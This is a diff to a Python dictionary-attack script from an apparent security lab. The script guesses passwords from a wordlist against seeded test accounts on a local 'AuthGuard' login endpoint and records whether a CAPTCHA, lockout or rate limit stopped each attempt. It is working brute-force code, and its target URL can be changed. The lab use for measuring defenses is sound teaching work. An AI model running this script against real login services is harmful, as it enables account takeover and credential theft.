@@ -1,5 +1,15 @@
 #!/usr/bin/env python3
+"""
+Dictionary attack against ALL seeded users on the AuthGuard server.
 
+Target : http://localhost:3000/api/login  (POST)
+Body   : {"username": "<user>", "password": "<guess>"}
+
+Usage:
+    python brute_force.py                   # attack defended server
+    python brute_force.py --delay 0         # full speed
+    python brute_force.py --url http://localhost:3000/api/login
+"""
 
 import requests
 import time
@@ -13,9 +23,8 @@ from datetime import datetime
 # ---------------------------------------------------------------------------
 DEFAULT_URL      = "http://localhost:3000/api/login"
 DEFAULT_WORDLIST = os.path.join(os.path.dirname(__file__), "wordlist.txt")
-REQUEST_DELAY    = 0.05   # seconds between requests per user
+REQUEST_DELAY    = 0.05
 
-# All seeded test accounts (from authguard/scripts/seed.js)
 TARGET_USERS = [
     "alice", "bob", "charlie", "diana", "eve",
     "frank", "grace", "henry", "isabella", "jack",
@@ -36,7 +45,7 @@ def banner():
     print(f"""
 {CYAN}{BOLD}╔══════════════════════════════════════════════╗
 ║       Online Brute-Force Attack Tool         ║
-║       IS Security Lab — Phase 2              ║
+║       IS Security Lab — Phase 2 / 4         ║
 ║       Mode: ALL USERS — one shot             ║
 ╚══════════════════════════════════════════════╝{RESET}
 """)
@@ -52,10 +61,22 @@ def load_wordlist(path: str) -> list[str]:
     return words
 
 
+def classify_response(status_code: int, message: str) -> str:
+    """Return which defense (if any) blocked this attempt."""
+    msg = message.lower()
+    if status_code == 429 or "too many requests" in msg or "wait 1 minute" in msg:
+        return "rate_limit"
+    if status_code == 403 or "locked" in msg:
+        return "lockout"
+    if "captcha" in msg:
+        return "captcha"
+    return "none"
+
+
 def try_login(session: requests.Session, url: str, username: str, password: str):
     """
     Send one login attempt.
-    Returns (success: bool, status_code: int).
+    Returns (success: bool, status_code: int, defense: str, message: str).
     """
     try:
         resp = session.post(
@@ -68,24 +89,26 @@ def try_login(session: requests.Session, url: str, username: str, password: str)
             data = resp.json()
 
         success = resp.status_code == 200 and bool(data.get("success"))
-        return success, resp.status_code
+        message = data.get("message", "")
+        defense = classify_response(resp.status_code, message) if not success else "none"
+        return success, resp.status_code, defense, message
 
     except requests.exceptions.ConnectionError:
         print(f"\n{RED}[!] Connection refused — is the server running?")
         print(f"    Start it:  cd authguard && node server.js{RESET}")
         sys.exit(1)
     except requests.exceptions.Timeout:
-        return False, 0
+        return False, 0, "none", "timeout"
     except Exception as exc:
         print(f"\n{RED}[!] Error: {exc}{RESET}")
-        return False, 0
+        return False, 0, "none", str(exc)
 
 
-def attack_user(session: requests.Session, url: str, username: str,
-                wordlist: list[str], delay: float) -> dict:
-    """Try every password in the wordlist against one username."""
+def attack_user(session, url, username, wordlist, delay) -> dict:
+    """Try every password against one username. Stops on success or hard block."""
     found_password = None
-    blocked_at     = None
+    stopped_by     = None   # "captcha" | "rate_limit" | "lockout" | None
+    stopped_at     = None
     attempts       = 0
 
     for password in wordlist:
@@ -93,35 +116,51 @@ def attack_user(session: requests.Session, url: str, username: str,
         print(f"\r  [{username:<10}] attempt {attempts:>4}/{len(wordlist)}  "
               f"testing '{password}' ...", end="", flush=True)
 
-        success, status_code = try_login(session, url, username, password)
+        success, status_code, defense, message = try_login(session, url, username, password)
 
         if success:
             found_password = password
-            print(f"\r  {GREEN}{BOLD}[CRACKED] {username:<10} => '{password}' "
+            print(f"\r  {GREEN}{BOLD}[CRACKED]  {username:<10} => '{password}' "
                   f"(attempt #{attempts}){RESET}")
             break
 
-        if status_code in (429, 403):
-            blocked_at = attempts
-            print(f"\r  {YELLOW}[BLOCKED] {username:<10}  server returned {status_code} "
-                  f"after {blocked_at} attempts{RESET}")
+        if defense == "captcha":
+            stopped_by = "captcha"
+            stopped_at = attempts
+            print(f"\r  {YELLOW}[CAPTCHA]  {username:<10}  blocked at attempt #{attempts} "
+                  f"— CAPTCHA required{RESET}                    ")
+            break
+
+        if defense == "rate_limit":
+            stopped_by = "rate_limit"
+            stopped_at = attempts
+            print(f"\r  {YELLOW}[RATE LIM] {username:<10}  blocked at attempt #{attempts} "
+                  f"— rate limit hit{RESET}                    ")
+            break
+
+        if defense == "lockout":
+            stopped_by = "lockout"
+            stopped_at = attempts
+            print(f"\r  {YELLOW}[LOCKOUT]  {username:<10}  blocked at attempt #{attempts} "
+                  f"— account locked{RESET}                    ")
             break
 
         if delay > 0:
             time.sleep(delay)
 
-    if not found_password and not blocked_at:
-        print(f"\r  {RED}[FAILED]  {username:<10}  not found in wordlist{RESET}          ")
+    if not found_password and not stopped_by:
+        print(f"\r  {RED}[FAILED]   {username:<10}  not found in wordlist{RESET}          ")
 
     return {
         "username":   username,
         "attempts":   attempts,
         "found":      found_password,
-        "blocked_at": blocked_at,
+        "stopped_by": stopped_by,
+        "stopped_at": stopped_at,
     }
 
 
-def run_attack(url: str, users: list[str], wordlist: list[str], delay: float):
+def run_attack(url, users, wordlist, delay) -> tuple:
     session = requests.Session()
     session.headers.update({"User-Agent": "Mozilla/5.0 (BruteForceBot/1.0)"})
 
@@ -129,7 +168,7 @@ def run_attack(url: str, users: list[str], wordlist: list[str], delay: float):
     print(f"{BOLD}Users       :{RESET} {', '.join(users)}")
     print(f"{BOLD}Passwords   :{RESET} {len(wordlist)}")
     print(f"{BOLD}Delay/req   :{RESET} {delay}s")
-    print("=" * 54)
+    print("=" * 56)
 
     results    = []
     start_time = time.time()
@@ -141,119 +180,118 @@ def run_attack(url: str, users: list[str], wordlist: list[str], delay: float):
 
     elapsed = time.time() - start_time
 
-    # ------------------------------------------------------------------
-    # Final summary
-    # ------------------------------------------------------------------
-    cracked  = [r for r in results if r["found"]]
-    blocked  = [r for r in results if r["blocked_at"]]
-    failed   = [r for r in results if not r["found"] and not r["blocked_at"]]
-    total_attempts = sum(r["attempts"] for r in results)
+    cracked      = [r for r in results if r["found"]]
+    captcha_hit  = [r for r in results if r["stopped_by"] == "captcha"]
+    lockout_hit  = [r for r in results if r["stopped_by"] == "lockout"]
+    ratelim_hit  = [r for r in results if r["stopped_by"] == "rate_limit"]
+    failed       = [r for r in results if not r["found"] and not r["stopped_by"]]
+    total_att    = sum(r["attempts"] for r in results)
 
-    print(f"\n\n{CYAN}{BOLD}{'='*54}")
+    print(f"\n\n{CYAN}{BOLD}{'='*56}")
     print("              FULL ATTACK SUMMARY")
-    print(f"{'='*54}{RESET}")
+    print(f"{'='*56}{RESET}")
     print(f"  Target URL     : {url}")
     print(f"  Users targeted : {len(users)}")
-    print(f"  Total attempts : {total_attempts}")
+    print(f"  Total attempts : {total_att}")
     print(f"  Time elapsed   : {elapsed:.2f}s")
-    print(f"  Avg per user   : {elapsed/len(users):.2f}s")
     print()
 
     if cracked:
         print(f"  {GREEN}{BOLD}CRACKED ({len(cracked)}/{len(users)}):{RESET}")
         for r in cracked:
-            print(f"    {GREEN}✓  {r['username']:<12} => '{r['found']}'  "
-                  f"(#{r['attempts']} attempts){RESET}")
+            print(f"    {GREEN}+  {r['username']:<12} => '{r['found']}'  (#{r['attempts']}){RESET}")
 
-    if blocked:
-        print(f"\n  {YELLOW}BLOCKED ({len(blocked)}/{len(users)}):{RESET}")
-        for r in blocked:
-            print(f"    {YELLOW}⚠  {r['username']:<12} locked after {r['blocked_at']} attempts{RESET}")
+    if captcha_hit:
+        print(f"\n  {YELLOW}CAPTCHA BLOCKED ({len(captcha_hit)}/{len(users)}):{RESET}")
+        for r in captcha_hit:
+            print(f"    {YELLOW}!  {r['username']:<12} stopped at attempt #{r['stopped_at']}{RESET}")
+
+    if lockout_hit:
+        print(f"\n  {YELLOW}ACCOUNT LOCKED ({len(lockout_hit)}/{len(users)}):{RESET}")
+        for r in lockout_hit:
+            print(f"    {YELLOW}!  {r['username']:<12} locked at attempt #{r['stopped_at']}{RESET}")
+
+    if ratelim_hit:
+        print(f"\n  {YELLOW}RATE LIMITED ({len(ratelim_hit)}/{len(users)}):{RESET}")
+        for r in ratelim_hit:
+            print(f"    {YELLOW}!  {r['username']:<12} blocked at attempt #{r['stopped_at']}{RESET}")
 
     if failed:
         print(f"\n  {RED}NOT FOUND ({len(failed)}/{len(users)}):{RESET}")
         for r in failed:
-            print(f"    {RED}✗  {r['username']}{RESET}")
+            print(f"    {RED}-  {r['username']}{RESET}")
 
-    print(f"\n{CYAN}{BOLD}{'='*54}{RESET}\n")
+    print(f"\n{CYAN}{BOLD}{'='*56}{RESET}\n")
 
-    save_report(url, users, wordlist, results, total_attempts, elapsed)
+    report_path = save_report(url, users, wordlist, results, total_att, elapsed)
+    return results, elapsed, report_path
 
 
 def save_report(url, users, wordlist, results, total_attempts, elapsed):
-    """Write a plain-text report to attack/reports/<timestamp>.txt"""
     reports_dir = os.path.join(os.path.dirname(__file__), "reports")
     os.makedirs(reports_dir, exist_ok=True)
 
     timestamp   = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
     report_path = os.path.join(reports_dir, f"attack_{timestamp}.txt")
 
-    cracked = [r for r in results if r["found"]]
-    blocked = [r for r in results if r["blocked_at"]]
-    failed  = [r for r in results if not r["found"] and not r["blocked_at"]]
+    cracked     = [r for r in results if r["found"]]
+    captcha_hit = [r for r in results if r["stopped_by"] == "captcha"]
+    lockout_hit = [r for r in results if r["stopped_by"] == "lockout"]
+    ratelim_hit = [r for r in results if r["stopped_by"] == "rate_limit"]
+    failed      = [r for r in results if not r["found"] and not r["stopped_by"]]
 
-    lines = []
-    lines.append("=" * 54)
-    lines.append("       IS SECURITY LAB — BRUTE FORCE ATTACK REPORT")
-    lines.append("=" * 54)
-    lines.append(f"  Date/Time      : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-    lines.append(f"  Target URL     : {url}")
-    lines.append(f"  Users targeted : {len(users)}")
-    lines.append(f"  Wordlist size  : {len(wordlist)} passwords")
-    lines.append(f"  Total attempts : {total_attempts}")
-    lines.append(f"  Time elapsed   : {elapsed:.2f}s")
-    lines.append(f"  Avg per user   : {elapsed / len(users):.2f}s")
-    lines.append("")
-    lines.append("-" * 54)
-    lines.append(f"  CRACKED  : {len(cracked)}/{len(users)} accounts")
-    lines.append(f"  BLOCKED  : {len(blocked)}/{len(users)} accounts")
-    lines.append(f"  FAILED   : {len(failed)}/{len(users)} accounts")
-    lines.append("-" * 54)
+    lines = [
+        "=" * 56,
+        "     IS SECURITY LAB — BRUTE FORCE ATTACK REPORT",
+        "=" * 56,
+        f"  Date/Time      : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        f"  Target URL     : {url}",
+        f"  Users targeted : {len(users)}",
+        f"  Wordlist size  : {len(wordlist)} passwords",
+        f"  Total attempts : {total_attempts}",
+        f"  Time elapsed   : {elapsed:.2f}s",
+        f"  Avg per user   : {elapsed / len(users):.2f}s",
+        "",
+        "-" * 56,
+        f"  CRACKED        : {len(cracked)}/{len(users)} accounts",
+        f"  CAPTCHA BLOCK  : {len(captcha_hit)}/{len(users)} accounts",
+        f"  LOCKOUT BLOCK  : {len(lockout_hit)}/{len(users)} accounts",
+        f"  RATE LIM BLOCK : {len(ratelim_hit)}/{len(users)} accounts",
+        f"  NOT FOUND      : {len(failed)}/{len(users)} accounts",
+        "-" * 56,
+        "",
+    ]
 
-    if cracked:
-        lines.append("")
-        lines.append("  [CRACKED ACCOUNTS]")
-        for r in cracked:
-            lines.append(f"    username : {r['username']}")
-            lines.append(f"    password : {r['found']}")
-            lines.append(f"    attempts : {r['attempts']}")
-            lines.append("")
+    for r in results:
+        if r["found"]:
+            status = f"CRACKED — password: '{r['found']}'"
+        elif r["stopped_by"] == "captcha":
+            status = f"BLOCKED by CAPTCHA at attempt #{r['stopped_at']}"
+        elif r["stopped_by"] == "lockout":
+            status = f"BLOCKED by lockout at attempt #{r['stopped_at']}"
+        elif r["stopped_by"] == "rate_limit":
+            status = f"BLOCKED by rate limit at attempt #{r['stopped_at']}"
+        else:
+            status = "NOT FOUND"
+        lines.append(f"  {r['username']:<12} | attempts: {r['attempts']:>3} | {status}")
 
-    if blocked:
-        lines.append("  [BLOCKED ACCOUNTS]")
-        for r in blocked:
-            lines.append(f"    username : {r['username']}  "
-                         f"(blocked after {r['blocked_at']} attempts)")
-        lines.append("")
-
-    if failed:
-        lines.append("  [NOT FOUND]")
-        for r in failed:
-            lines.append(f"    username : {r['username']}")
-        lines.append("")
-
-    lines.append("=" * 54)
-
-    report_text = "\n".join(lines)
+    lines += ["", "=" * 56]
 
     with open(report_path, "w", encoding="utf-8") as f:
-        f.write(report_text)
+        f.write("\n".join(lines))
 
     print(f"[*] Report saved → {report_path}\n")
+    return report_path
 
 
 # ---------------------------------------------------------------------------
 # Entry point
 # ---------------------------------------------------------------------------
 def main():
-    parser = argparse.ArgumentParser(
-        description="Dictionary attack against all AuthGuard test users.")
-    parser.add_argument("--url",      default=DEFAULT_URL,
-                        help="Target login URL")
-    parser.add_argument("--wordlist", default=DEFAULT_WORDLIST,
-                        help="Path to password wordlist")
-    parser.add_argument("--delay",    type=float, default=REQUEST_DELAY,
-                        help="Delay in seconds between requests (default 0.05)")
+    parser = argparse.ArgumentParser(description="Dictionary attack against all AuthGuard test users.")
+    parser.add_argument("--url",      default=DEFAULT_URL)
+    parser.add_argument("--wordlist", default=DEFAULT_WORDLIST)
+    parser.add_argument("--delay",    type=float, default=REQUEST_DELAY)
     args = parser.parse_args()
 
     banner()
